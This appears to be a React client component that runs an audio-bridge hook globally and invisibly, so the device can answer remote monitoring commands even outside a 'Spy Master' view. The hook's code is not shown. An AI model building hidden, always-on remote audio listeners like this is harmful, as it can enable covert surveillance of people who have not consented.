'use client'

import { useAuth } from '@/hooks/useAuth'
import { useAudioBridge } from '@/hooks/useAudioBridge'

/**
 * BridgeListener: Global Neural Signal Consumer (v18.1.8)
 * Ensures that this device can respond to remote monitoring requests 
 * even when the user is not in the Spy Master view.
 */
export function BridgeListener() {
    const { user } = useAuth();
    
    // We invoke the hook globally. The hook's internal useEffect
    // will handle the Supabase Realtime subscription for device commands.
    useAudioBridge(user);

    return null; // Transparent background service
}
